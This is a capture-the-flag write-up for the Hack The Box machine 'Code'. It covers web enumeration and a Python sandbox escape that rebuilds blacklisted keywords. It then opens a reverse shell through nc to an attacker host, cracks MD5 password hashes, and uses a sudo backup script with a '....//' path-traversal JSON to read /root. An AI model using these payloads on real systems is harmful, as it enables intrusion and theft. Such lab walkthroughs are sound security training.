![Capture d'écran 2025-04-26 105912](https://github.com/user-attachments/assets/33168341-5510-4065-b97c-4e4c7ccf6fbe)

### Introduction

This machine, **Code**, is part of **Hack The Box (HTB)** and is rated as an **easy**-level Linux challenge. It provides a great opportunity to practice **web enumeration, dynamic code evaluation bypass techniques, lateral movement** and **privilege escalation**. Throughout this challenge, we will explore a restricted web application, find a way to execute arbitrary code despite strong filtering, leverage credentials to move between user accounts, and ultimately gain root access. Let's dive in and break into this machine!

--- 
### Initial enumeration

To start, we add the target's IP address to our `/etc/hosts` file and perform a full port scan using **nmap** :

```
nmap code.htb -sV -sC -p- -oN nmapres
```

![Capture d'écran 2025-04-26 114529](https://github.com/user-attachments/assets/0c0a7306-5972-4fcb-b21e-5292c16f06ce)

The scan reveals two open ports :

-  `22/tcp` : using `ssh` service
-  `5000/tcp` : using `http` service

Next, we can perform a directory enumeration using `gobuster`.

```
gobuster dir -u http://code.htb:5000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusterres
```

![Capture d'écran 2025-04-26 115601](https://github.com/user-attachments/assets/a1a4b92c-09e3-49fa-91b6-5810d59f1423)

The scan completed successfully and identified the following endpoints:

- `/login` (HTTP 200 OK) — Login page.
    
- `/register` (HTTP 200 OK) — User registration page.
    
- `/logout` (HTTP 302 Found) — Redirects to `/`.
    
- `/about` (HTTP 200 OK) — About page.
    
- `/codes` (HTTP 302 Found) — Redirects to `/login`.

The presence of `/login`, `/register`, and `/codes` suggests that the application likely implements user authentication and authorization mechanisms. The `/codes` endpoint could potentially expose sensitive functionality, but it appears to be protected behind a login page. These findings guided the next steps of the enumeration toward authentication and session management testing.

To gather initial information about the web server, I ran **WhatWeb** against `http://10.10.11.62:5000`.  

![Capture d'écran 2025-04-26 120423](https://github.com/user-attachments/assets/96f5a096-4443-4595-9354-08f4b1f0f21e)

The results identified key technologies used by the application :

- **Web Server**: Gunicorn version 20.0.4, indicating a Python-based backend.
    
- **Frontend Technologies**: HTML5 and jQuery 3.6.0.
    
- **Page Title**: "Python Code Editor", suggesting that the application may allow users to interact with or execute Python code dynamically.

These details pointed toward a potentially vulnerable functionality involving code execution, and guided the next phase of testing.

Let's check the web page at `http://code.htb:5000` : 

![Capture d'écran 2025-04-26 120858](https://github.com/user-attachments/assets/8259455a-0076-4e3f-9fb9-55e98dd13445)

We can see that we can run Python code. And I first tried to execute the following code : 

```python
import subprocess

result = subprocess.run(["whoami"], capture_output=True, text=True)

print(result.stdout.strip())

```

During the initial attempts, the system triggered a code validation mechanism, effectively blocking our payload :

![Capture d'écran 2025-04-26 130559](https://github.com/user-attachments/assets/6039cbeb-2a19-4c7a-82bf-b4401037181d)

Based on this behavior, we inferred the presence of a keyword blacklist, likely filtering dangerous terms such as `import`, `eval`, `exec` or `open`.

To bypass this restriction, our strategy was to perform an **object traversal attack**.  
Instead of writing forbidden keywords directly, we leveraged Python’s introspection features to dynamically retrieve the `eval` function from the runtime environment.
We used the following code snippet to enumerate the subclasses of the base `object` class, attempting to locate a reference to `eval` through the `__globals__` attribute :

```python
for i in range(100):
    try:
        x = ''.__class__.__bases__[0].__subclasses__()[i].__init__.__globals__['__buil'+'tins__']
        if 'ev'+'al' in x:
            print(x['ev'+'al']("2+2"))
            break
    except Exception as e:
        continue
```

![Capture d'écran 2025-04-26 135909](https://github.com/user-attachments/assets/e0a863cd-e0c0-4828-a411-481914c1e55e)

> As shown, the payload successfully executed and evaluated the expression `2+2`.

This demonstrates that despite restrictive keyword filtering, **runtime object graph traversal combined with dynamic string reconstruction** allows us to access restricted functionalities and execute arbitrary code.

--- 
### Initial foothold

Now, we are leveraging the same technique to **establish a reverse shell**.

The code snippet below outlines how we modify the payload to execute a reverse shell :

```python
for i in range(100):
    try:
        x = ''.__class__.__bases__[0].__subclasses__()[i].__init__.__globals__['__buil'+'tins__']
        if 'ev'+'al' in x:
            print(x['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f").re'+'ad()'))
            break
    except Exception as e:
        continue

```

Notice that critical keywords such as `eval`, `import`, and `os` are deliberately split and reconstructed at runtime.
This technique helps to bypass any basic keyword filtering or blacklisting mechanisms that may be implemented by the application to prevent command injection or code execution.

When executed, this payload results in a reverse shell connection being established between the target machine and our local machine (as defined by `<LHOST>` and `<LPORT>`).
This enables us to interact with the target system through a shell, thus gaining unauthorized control.

![Capture d'écran 2025-04-26 145457](https://github.com/user-attachments/assets/fb63a532-24af-4577-a5f5-285211fac3a8)

After executing the payload, we successfully triggered the reverse shell.
We can see that we are connected as `app-producted` user : 

![Capture d'écran 2025-04-26 145828](https://github.com/user-attachments/assets/153100ef-e0a1-46dc-867d-b7591b77dc6f)

---
### User flag

And we can get the `user` flag : 

![Capture d'écran 2025-04-26 145934](https://github.com/user-attachments/assets/e35baee3-ac5b-4fe3-950a-07e04f02ddcb)

Upon inspecting the `app.py` source code, we observe that the application relies on a `database.db` file for data storage :

![Capture d'écran 2025-04-26 151457](https://github.com/user-attachments/assets/625bf722-6fb6-44ca-a111-10d134a5d4ec)

From this database, we are able to extract the password hashes of two users :

![Capture d'écran 2025-04-26 151857](https://github.com/user-attachments/assets/80070041-9a50-4bfa-933c-615c010369bd)

Further analysis of the register route within the application confirms that these passwords are hashed using the `MD5` algorithm :

![Capture d'écran 2025-04-26 152210](https://github.com/user-attachments/assets/1b591c87-349d-4b83-806f-8492de867039)

---
### Lateral movement

Knowing this, we used `hashcat` in order to crack `martin`'s password  :

```
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![Capture d'écran 2025-04-26 152912](https://github.com/user-attachments/assets/de540a5e-9953-49a5-83e1-d280079afab8)

Once the password was recovered, we were able to connect to `martin`'s account via `SSH` :

![Capture d'écran 2025-04-26 153536](https://github.com/user-attachments/assets/ccadddf0-e09e-4050-b268-f40ebaeb5abc)

---

### Exploiting `backy.sh` to access `/root` 

During post-exploitation enumeration, we identified that `martin` could execute `/usr/bin/backy.sh` as `root` without password via `sudo`.

![Capture d'écran 2025-04-26 154107](https://github.com/user-attachments/assets/4f3bed9e-0f6e-4a91-a175-d871f40457a9)

So we can check the script `backy.sh` : 

![Capture d'écran 2025-04-26 160308](https://github.com/user-attachments/assets/b28463b7-f4cf-4d43-8a23-6652f776164b)

After analyzing the `backy.sh` script, we noticed that it processes a user-supplied JSON file using `jq` to sanitize the `directories_to_archive` field by removing any `../` sequences.  
It then ensures that the resulting directories start with `/var/` or `/home/`.

However, by carefully crafting the JSON input with sequences like `....//../....//`, we can **bypass the sanitization**:

- The `gsub("\\.\\./"; "")` replacement only removes exact `../` patterns, but not variations like `....//../....//`.
    
- Thus, after the weak cleaning process, the final resolved path still points to `/root/`.
    

Here is the crafted `xploit.json`:

```json
{
"directories_to_archive" : ["/home/....//../....//root/"],
"destination" : "/tmp"
}
```

By executing the script with our malicious JSON :

```
sudo /usr/bin/backy.sh xploit.json
```

![Capture d'écran 2025-04-26 162802](https://github.com/user-attachments/assets/ec2effdc-78e8-4125-90f8-84733885ca67)

The script allowed the backup of the `/root/` directory into `/tmp` under a `.tar.bz2` archive.

![Capture d'écran 2025-04-26 163618](https://github.com/user-attachments/assets/aed2e253-6688-46dc-b849-ea54a22f5508)

---
### Root flag 

To retrieve the `root` flag, we extracted the `.tar.bz2` archive with the following command :
```
tar -xvjf code_home_.._.._root_2025_April.tar.bz2
```

After extraction, we were able to access the `root` directory and obtain the `root.txt` flag :

![Capture d'écran 2025-04-26 163834](https://github.com/user-attachments/assets/3fb480b8-1cff-4ae1-952f-e42b3bebb0da)

Additionally, the archive contained the `root` user's private SSH key, allowing us to gain full `root` access via SSH :

![Capture d'écran 2025-04-26 165437](https://github.com/user-attachments/assets/4040f838-df16-404e-9369-70e57a620d18)

---

**Congratulations!**  
This challenge was a great exercise to practice advanced enumeration, dynamic code execution bypassing filtering mechanisms and lateral movement between users. From crafting payloads with object traversal to exploiting a backup script to access sensitive directories, this CTF emphasized creativity, persistence and attention to subtle misconfigurations to ultimately achieve root access.

Thanks for reading, and happy hacking!

![Capture d'écran 2025-04-26 164113](https://github.com/user-attachments/assets/f82689a6-e0b7-43e9-9089-2a48401fddcb)



